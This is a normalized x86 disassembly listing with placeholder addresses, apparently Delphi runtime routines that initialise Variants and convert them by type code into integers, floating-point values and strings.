call sub_414174
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_414174
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_414230
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41438c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4142dc
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_410e58
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_414340
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4145ac ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_414290
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_414174
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_414230
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41438c
fistp [ esp ]
fwait
jmp r-xdata
sub_414754
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_405d28
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_411298
pop ebx
pop ebp
retn 0x8
sub_41478c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_405d28
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_411298
pop ebx
pop ebp
retn 0x8
sub_4147c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41487c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405d28
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_411298
movzx eax [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414883
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4057d4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_409864
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_405ea8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4057d4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4097dc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_405ea8
jmp r-xdata
jmp r-xdata
call sub_410ef4
sub_41488c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41494b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414929
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x100
call sub_411298
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_405e6c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405f58
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4057d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414930
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
sub_414958
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4149ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_411a68
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_414a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149b5
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
sub_4149bc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_416178
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414a31
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_41163c
retn
sub_414a44
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414f70
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_414a7e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405584
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_405530
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405584
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40b6e0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_405584
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40b6e0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_405584
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_414754
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4057d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41478c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4057d4
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405f58
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4057d4
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_4147c4
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4057d4
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_409e5c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_405584
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_409e5c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_414a44
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_41488c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_405584
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f77
lea eax [ ebp - 0x74 ]
mov edx 0x7
call sub_405554
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_405d40
lea eax [ ebp - 0x4c ]
mov edx 0xb
call sub_405554
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_405d40
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_414958
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_405584
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_405584
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_410e58
test ah 0x40
je r-xdata
mov eax esi
call sub_405530
mov edx eax
mov eax ebx
call sub_4149bc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_41488c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_405584
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_41488c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_405584
jmp r-xdata
jmp [ eax * 4 + jump_table_414d06 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40b6e0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40b6e0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_414754
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4057d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41478c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4057d4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405758
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4147c4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4057d4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_409e5c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_409e5c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_405584
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_414a44
jmp r-xdata
sub_414f80
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41502a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41500d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x8
call sub_411298
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_405e6c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415014
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
sub_415038
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41508e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_411a68
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_415164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415095
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
sub_41509c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_415154
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_416178
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41515b
lea eax [ ebp - 0x20 ]
call sub_405d28
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_415137
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_405e6c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_41163c
retn
sub_415164
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4156a9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41519d ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405ea8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_405d28
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405ea8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40b6e0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_405ea8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40b6e0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_405ea8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_414754
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_405d64
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41478c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_405d64
jmp r-xdata
push esi
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_405f58
jmp r-xdata
lea edx [ ebp - 0x1c ]
movzx eax [ ebx + 0x8 ]
call sub_4147c4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_405d64
jmp r-xdata
lea edx [ ebp - 0x20 ]
movsx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_409d70
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_409e5c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_405ea8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_409e5c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_415164
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_414f80
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_405d64
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4156b0
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x68 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_405d40
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x30 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_405d40
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_415038
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_405d64
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_405ea8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_410e58
test ah 0x40
je r-xdata
mov eax esi
call sub_405d28
mov edx eax
mov eax ebx
call sub_41509c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_414f80
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_405d64
lea edx [ ebp - 0x6c ]
mov eax ebx
call sub_414f80
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_405d64
jmp r-xdata
jmp [ eax * 4 + jump_table_415418 ]
lea edx [ ebp - 0x3c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x44 ]
call sub_40b6e0
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40b6e0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x4c ]
call sub_414754
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_405d64
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41478c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_405d64
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405e6c
jmp r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4147c4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_405d64
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_405ea8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_409d70
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x64 ]
call sub_409e5c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
call sub_409e5c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_405ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_415164
jmp r-xdata
sub_4156b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_415722
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_411a68
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_407024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415729
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
mov dx 0xd
mov ax 0x101
call sub_410e58
sub_415730
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_4156b8
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_407024
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_407024
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_40700c
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_416178
test al al
je r-xdata
mov eax esi
call sub_40700c
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_410e58
jmp r-xdata
movzx eax [ ebx ]
mov dx 0xd
call sub_410e58
mov eax esi
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_404704
test al al
jne r-xdata
sub_4157fc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_40700c
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_40700c
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_410e58
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_407024
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_407024
jmp r-xdata
jmp r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_416178
test al al
je r-xdata
movzx eax [ ebx ]
mov dx 0x9
call sub_410e58
mov eax esi
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_404704
test al al
jne r-xdata
sub_4158a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_4115c0
mov [ edi ] 0x3
